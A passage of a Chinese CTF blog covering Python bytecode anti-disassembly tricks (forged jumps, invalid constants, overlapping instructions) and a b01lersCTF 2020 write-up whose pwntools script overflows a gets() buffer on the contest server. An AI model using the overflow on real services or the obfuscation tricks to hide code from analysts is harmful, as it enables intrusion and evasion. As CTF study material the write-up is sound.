class="line">        <span class="hljs-number"> 2214 </span>LOAD_CONST              <span class="hljs-number"> 0 </span>(None)</span><br><span class="line">        <span class="hljs-number"> 2217 </span>RETURN_VALUE</span><br></pre></td></tr></tbody></table></figure><p>直接输出，这样就得到需要的flag</p><h4 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h4><p>从上面也可以看出来，一个不经过处理的pyc文件是没有任何安全性可言的，甚至可以被一些工具如uncompyle6或者<a href="https://tool.lu/pyc/">在线工具</a>直接反编译成python代码，并且从代码风格来看准确率还是很高的，这时候就需要掌握一些简单的混淆/反混淆的技巧</p><h5 id="uncompyle6"><a href="#uncompyle6" class="headerlink" title="uncompyle6"></a>uncompyle6</h5><p>这个工具还是很好用的，但是一旦报错就停止对文件的分析，而且想让uncompyle6等工具报错也很简单，只需要在开头添加一个绝对跳转就可以了，<code>JUMP_ABSOLUTE 3</code>对应的字节码为 <code>71 03 00</code>，同时修改<code>co_code</code>的长度，这个时候使用一些工具就会报错</p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;&lt; <span class="hljs-string">Error: Decompiling stopped due to &lt;class 'uncompyle6.semantics.pysource.ParserError'&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>但是<code>dis</code>还是可以正常工作的，程序也是可以正常执行的，因为我们自己加入了3个字节，然后跳转到第四个字节（编号为3）的位置，只是多了一个执行周期，对程序的执行流程没有任何影响。</p><h5 id="dis"><a href="#dis" class="headerlink" title="dis"></a>dis</h5><p>对于一些新手来说，没法使用工具就基本上束手无策了，但是对于熟练掌握汇编语言的人来说，读懂<code>dis</code>解析出来的代码太容易了，就像刚刚我们就很容易的读懂了这道题目的执行逻辑<del>（虽然很简单）</del></p><p>所以还需要一定的方法阻止破解者使用<code>dis</code>进行分析</p><p>这会需要多一些处理</p><p>给代码段头部添加 <code>0x71 0x00 0x06 0x64 0xff 0xff</code> 。 同样需要修改 co_code 的长度。</p><p>这段指令的意义很简单</p><figure class="highlight basic hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-symbol">0 </span>JUMP_ABSOLUTE            <span class="hljs-number">6</span></span><br><span class="line"><span class="hljs-symbol">3 </span>LOAD_CONST              <span class="hljs-number">65535</span> </span><br><span class="line"><span class="hljs-symbol">6 </span>...</span><br></pre></td></tr></tbody></table></figure><p>直接跳到了编号为6的位置，中间一句是不执行的，但是<code>dis</code>解析的时候会判断这句报错，因为不存在第65535项常量，这是条非法指令。但由于第一条绝对跳转的存在，第二条指令永远都不会被执行。通常的反汇编器如dis并不能理解实际执行的控制流，当反汇编器尝试反汇编第二条指令时，会去读取<code>co_const</code>的第65535项并且抛出一个异常。然后<code>dis</code>就会相应报错：</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IndexError: <span class="hljs-built_in">tuple</span> index out of <span class="hljs-built_in">range</span></span><br></pre></td></tr></tbody></table></figure><p>这比骗过IDA要容易得多</p><h5 id="虚假分支"><a href="#虚假分支" class="headerlink" title="虚假分支"></a>虚假分支</h5><p>合理设置条件，创造出很多程序不可能执行的分支，但是逆向者需要认真鉴别每一条分支是否被执行。</p><p>这不会使逆向者反汇编失败，但是会对分析造成极大的困难，就像是可恨的<a href="https://security.tencent.com/index.php/blog/msg/112">控制流平坦化</a>，属实劝退。</p><p><del>而且也没什么好办法，只能慢慢分析</del></p><h5 id="重叠指令"><a href="#重叠指令" class="headerlink" title="重叠指令"></a>重叠指令</h5><p>重叠指令在有变长指令的机器（如X86)上有广泛应用。直接在网上找了一些x86重叠指令：</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">;单重叠</span><br><span class="line">00: EB 01           jmp  3</span><br><span class="line">02: 68 c3 90 90 90  push 0x909090c3</span><br><span class="line"></span><br><span class="line">;实际执行</span><br><span class="line">00: EB 01           jmp  3</span><br><span class="line">03: C3              retn</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">;多重叠指令</span><br><span class="line">00: EB02                    jmp  4</span><br><span class="line">02: 69846A40682C104000EB02  imul eax, [edx + ebp*2 + 0102C6840], 0x002EB0040</span><br><span class="line"></span><br><span class="line">;实际执行</span><br><span class="line">00: EB02       jmp  4</span><br><span class="line">04: 6A40       push 040</span><br><span class="line">06: 682C104000 push 0x40102C</span><br><span class="line">0B: EB02       jmp  0xF</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">;跳转至自身</span><br><span class="line">00: EBFF    jmp 1</span><br><span class="line">02: C0C300  rol bl, 0</span><br><span class="line"></span><br><span class="line">;实际执行</span><br><span class="line">00: EBFF    jmp 1</span><br><span class="line">01: FFC0    inc eax</span><br><span class="line">03: C3      retn</span><br></pre></td></tr></tbody></table></figure><p>在python上也同样适用</p><figure class="highlight basic hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-symbol">0 </span>JUMP_ABSOLUTE        [<span class="hljs-number">71</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span>]     <span class="hljs-number">5</span> </span><br><span class="line"><span class="hljs-symbol">3 </span>NOP           [<span class="hljs-number">09</span> -- --]</span><br><span class="line"><span class="hljs-symbol">4 </span>LOAD_CONST           [<span class="hljs-number">64</span> <span class="hljs-number">64</span> <span class="hljs-number">00</span>]     <span class="hljs-number">64</span></span><br><span class="line"><span class="hljs-symbol">7 </span>STOP_CODE            [<span class="hljs-number">00</span> -- --]</span><br></pre></td></tr></tbody></table></figure><p>一个简单的例子，进行了跳转之后，该位置是64，是有效指令所以读取了两个字节的操作数，实际上这段只执行了一句有效指令<code>LOAD_CONST 0</code></p><h5 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h5><p>现有的指令集是有定义的，但是如果有人修改了原有的定义，按照新的方式去赋值，就完全无法解析，遇见的不多，这样的情况似乎就只能通过函数的逻辑去猜测指令的意义</p><p><del>万恶的VM，万恶的出题人</del></p><h5 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h5><p>程序在循行开始的时候按照自己设定的加解密方式对真正的代码进行加密，然后再执行真正的代码部分，这样的方式利用python也可以实现</p><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>本来是由一个题发散出来，结果写了很多，都只是一些个人的理解，整理整理才觉得还有很多需要学的东西。</p><p>解析的时候借用了一个国外大佬写的<code>dis</code>的代码，输出的层次很清晰，非常适合学习，<a href="http://nedbatchelder.com/blog/200804/the_structure_of_pyc_files.html">原文</a>写的也很不错。</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> dis, marshal, struct, sys, time, types</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_file</span>(<span class="hljs-params">fname</span>):</span></span><br><span class="line">    f = <span class="hljs-built_in">open</span>(fname, <span class="hljs-string">"rb"</span>)</span><br><span class="line">    magic = f.read(<span class="hljs-number">4</span>)</span><br><span class="line">    moddate = f.read(<span class="hljs-number">4</span>)</span><br><span class="line">    modtime = time.asctime(time.localtime(struct.unpack(<span class="hljs-string">'I'</span>, moddate)[<span class="hljs-number">0</span>]))</span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">"magic %s"</span> % (magic.encode(<span class="hljs-string">'hex'</span>))</span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">"moddate %s (%s)"</span> % (moddate.encode(<span class="hljs-string">'hex'</span>), modtime)</span><br><span class="line">    code = marshal.load(f)</span><br><span class="line">    show_code(code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_code</span>(<span class="hljs-params">code, indent=<span class="hljs-string">''</span></span>):</span></span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">"%scode"</span> % indent</span><br><span class="line">    indent += <span class="hljs-string">'   '</span></span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">"%sargcount %d"</span> % (indent, code.co_argcount)</span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">"%snlocals %d"</span> % (indent, code.co_nlocals)</span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">"%sstacksize %d"</span> % (indent, code.co_stacksize)</span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">"%sflags %04x"</span> % (indent, code.co_flags)</span><br><span class="line">    show_hex(<span class="hljs-string">"code"</span>, code.co_code, indent=indent)</span><br><span class="line">    dis.disassemble(code)</span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">"%sconsts"</span> % indent</span><br><span class="line">    <span class="hljs-keyword">for</span> const <span class="hljs-keyword">in</span> code.co_consts:</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(const) == types.CodeType:</span><br><span class="line">            show_code(const, indent + <span class="hljs-string">'   '</span>)</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-built_in">print</span> <span class="hljs-string">"   %s%r"</span> % (indent, const)</span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">"%snames %r"</span> % (indent, code.co_names)</span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">"%svarnames %r"</span> % (indent, code.co_varnames)</span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">"%sfreevars %r"</span> % (indent, code.co_freevars)</span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">"%scellvars %r"</span> % (indent, code.co_cellvars)</span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">"%sfilename %r"</span> % (indent, code.co_filename)</span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">"%sname %r"</span> % (indent, code.co_name)</span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">"%sfirstlineno %d"</span> % (indent, code.co_firstlineno)</span><br><span class="line">    show_hex(<span class="hljs-string">"lnotab"</span>, code.co_lnotab, indent=indent)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_hex</span>(<span class="hljs-params">label, h, indent</span>):</span></span><br><span class="line">    h = h.encode(<span class="hljs-string">'hex'</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(h) &lt; <span class="hljs-number">60</span>:</span><br><span class="line">        <span class="hljs-built_in">print</span> <span class="hljs-string">"%s%s %s"</span> % (indent, label, h)</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-built_in">print</span> <span class="hljs-string">"%s%s"</span> % (indent, label)</span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(h), <span class="hljs-number">60</span>):</span><br><span class="line">            <span class="hljs-built_in">print</span> <span class="hljs-string">"%s   %s"</span> % (indent, h[i:i + <span class="hljs-number">60</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_file(sys.argv[<span class="hljs-number">1</span>])</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 攻防世界 </tag>
            
            <tag> python </tag>
            
            <tag> opcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>b01lersCTF-2020-wp</title>
      <link href="/2020/03/16/b01lersCTF-2020-wp/"/>
      <url>/2020/03/16/b01lersCTF-2020-wp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>这个比赛还算友好，而且少见的逆向比web还要多，出题人说之后会放源码和官方writeup，是个不错的学习的机会，这里把做出来的几道题先写一下（然后开始写作业……</p><span id="more"></span><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="Welcome-to-Earth"><a href="#Welcome-to-Earth" class="headerlink" title="Welcome to Earth"></a>Welcome to Earth</h4><p>我对web实际上是毫无兴趣的，但这题实在简单的过分，还是给做了，详细的就不说了，查看源码就可以发现，只要在调用<code>dead</code>之前进入到应该进去的页面就可以了（直接<code>F12</code>里debug暂停然后慢慢看就可以了……</p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>pwn也很久没做了，知识点还停留在刚学的时候，应付一下第一题就完事了</p><h4 id="Department-of-Flying-Vehicles"><a href="#Department-of-Flying-Vehicles" class="headerlink" title="Department of Flying Vehicles"></a>Department of Flying Vehicles</h4><p>IDA打开<del>(逆向看久了之后发现pwn题目的逻辑真的是简单得要命)</del>，漏洞也看得出来，利用的话还是不熟练，需要多练</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  __int64 v3; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">char</span> s1[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  __int64 v6; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  __int64 v7; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);</span><br><span class="line">  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);</span><br><span class="line">  v6 = <span class="hljs-number">1176165807576793170LL</span>;</span><br><span class="line">  v7 = <span class="hljs-number">1154282520852565777LL</span>;</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Dave has ruined our system. He updated the code, and now he even has trouble checking his own liscense!"</span>);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"If you can please make it work, we'll reward you!\n"</span>);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Welcome to the Department of Flying Vehicles."</span>);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Which liscense plate would you like to examine?\n &gt; "</span>, <span class="hljs-number">0LL</span>);</span><br><span class="line">  <span class="hljs-built_in">gets</span>(s1);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v6 == (v7 ^ *(_QWORD *)s1) )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(s1, <span class="hljs-string">"COOLDAV"</span>, <span class="hljs-number">8uLL</span>) )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Hi Dave!"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      v3 = <span class="hljs-built_in">sub_96A</span>(<span class="hljs-string">"flag.txt"</span>, <span class="hljs-string">"COOLDAV"</span>);</span><br><span class="line">      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Thank you so much! Here's your reward!\n%s"</span>, v3);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Error."</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>如果想要通过第一个if就必须要输入<code>COOLDAV</code>，这样的话就过不了第二个输入，看到<code>gets</code>直接考虑溢出覆盖变量的值，最简单的方法就是输入和其中的一个变量全都为<code>\0</code></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># io=process('./dfv')</span></span><br><span class="line">io=remote(<span class="hljs-string">'pwn.ctf.b01lers.com'</span>,<span class="hljs-number">1001</span>)</span><br><span class="line">io.recvuntil(<span class="hljs-string">'Which liscense plate would you like to examine?\n &gt; '</span>)</span><br><span class="line">payload=<span class="hljs-number">4</span>*p64(<span class="hljs-number">0</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p>就可以拿到flag<del>(但我忘了记录flag得值又懒得再跑一遍拿flag)</del></p><h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><h4 id="Chugga-Chugga"><a href="#Chugga-Chugga" class="headerlink" title="Chugga Chugga"></a>Chugga Chugga</h4><p>IDA打开</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall __noreturn <span class="hljs-title">main_main</span><span class="hljs-params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">signed</span> __int64 i; <span class="hljs-comment">// rcx</span></span><br><span class="line">  __int64 v3; <span class="hljs-comment">// r8</span></span><br><span class="line">  __int64 v4; <span class="hljs-comment">// r9</span></span><br><span class="line">  __int64 v5; <span class="hljs-comment">// r8</span></span><br><span class="line">  __int64 v6; <span class="hljs-comment">// r9</span></span><br><span class="line">  __int64 v7; <span class="hljs-comment">// r8</span></span><br><span class="line">  __int64 v8; <span class="hljs-comment">// r9</span></span><br><span class="line">  __int64 v9; <span class="hljs-comment">// r8</span></span><br><span class="line">  __int64 v10; <span class="hljs-comment">// r9</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v11; <span class="hljs-comment">// rcx</span></span><br><span class="line">  _BYTE *v12; <span class="hljs-comment">// rdx</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> __int64 v13; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v14; <span class="hljs-comment">// bl</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v15; <span class="hljs-comment">// r10</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v16; <span class="hljs-comment">// er11</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v17; <span class="hljs-comment">// r12</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v18; <span class="hljs-comment">// r13</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v19; <span class="hljs-comment">// er13</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v20; <span class="hljs-comment">// er14</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v21; <span class="hljs-comment">// ecx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v22; <span class="hljs-comment">// er14</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v23; <span class="hljs-comment">// cl</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v24; <span class="hljs-comment">// er13</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v25; <span class="hljs-comment">// r11</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v26; <span class="hljs-comment">// r12</span></span><br><span class="line">  _QWORD *v27; <span class="hljs-comment">// [rsp+8h] [rbp-A0h]</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> __int64 v28; <span class="hljs-comment">// [rsp+40h] [rbp-68h]</span></span><br><span class="line">  _QWORD *v29; <span class="hljs-comment">// [rsp+48h] [rbp-60h]</span></span><br><span class="line">  __int128 v30; <span class="hljs-comment">// [rsp+50h] [rbp-58h]</span></span><br><span class="line">  __int128 v31; <span class="hljs-comment">// [rsp+60h] [rbp-48h]</span></span><br><span class="line">  __int128 v32; <span class="hljs-comment">// [rsp+70h] [rbp-38h]</span></span><br><span class="line">  __int128 v33; <span class="hljs-comment">// [rsp+80h] [rbp-28h]</span></span><br><span class="line">  __int128 v34; <span class="hljs-comment">// [rsp+90h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int64)&amp;v33 &lt;= *(_QWORD *)(__readfsqword(<span class="hljs-number">0xFFFFFFF8</span>) + <span class="hljs-number">16</span>) )</span><br><span class="line">    <span class="hljs-built_in">runtime_morestack_noctxt</span>();</span><br><span class="line">  <span class="hljs-built_in">runtime_newobject</span>(a1, a2);</span><br><span class="line">  v29 = v27;</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0LL</span>; ; i = v13 )</span><br><span class="line">  {</span><br><span class="line">    v28 = i;</span><br><span class="line">    <span class="hljs-built_in">runtime_convT64</span>(a1, a2);</span><br><span class="line">    *(_QWORD *)&amp;v33 = &amp;unk_4A4C40;</span><br><span class="line">    *((_QWORD *)&amp;v33 + <span class="hljs-number">1</span>) = &amp;main_statictmp_2;</span><br><span class="line">    *(_QWORD *)&amp;v34 = &amp;unk_4A4480;</span><br><span class="line">    *((_QWORD *)&amp;v34 + <span class="hljs-number">1</span>) = v27;</span><br><span class="line">    a2 = (__int64)&amp;go_itab__os_File_io_Writer;</span><br><span class="line">    <span class="hljs-built_in">fmt_Fprintln</span>(</span><br><span class="line">      a1,</span><br><span class="line">      (__int64)&amp;go_itab__os_File_io_Writer,</span><br><span class="line">      (__int64)&amp;main_statictmp_2,</span><br><span class="line">      (__int64)&amp;unk_4A4C40,</span><br><span class="line">      v3,</span><br><span class="line">      v4,</span><br><span class="line">      (__int64)&amp;go_itab__os_File_io_Writer,</span><br><span class="line">      os_Stdout);</span><br><span class="line">    *(_QWORD *)&amp;v32 = &amp;unk_4A4C40;</span><br><span class="line">    *((_QWORD *)&amp;v32 + <span class="hljs-number">1</span>) = &amp;main_statictmp_3;</span><br><span class="line">    <span class="hljs-built_in">fmt_Fprintln</span>(</span><br><span class="line">      a1,</span><br><span class="line">      (__int64)&amp;go_itab__os_File_io_Writer,</span><br><span class="line">      (__int64)&amp;v32,</span><br><span class="line">      (__int64)&amp;main_statictmp_3,</span><br><span class="line">      v5,</span><br><span class="line">      v6,</span><br><span class="line">      (__int64)&amp;go_itab__os_File_io_Writer,</span><br><span class="line">      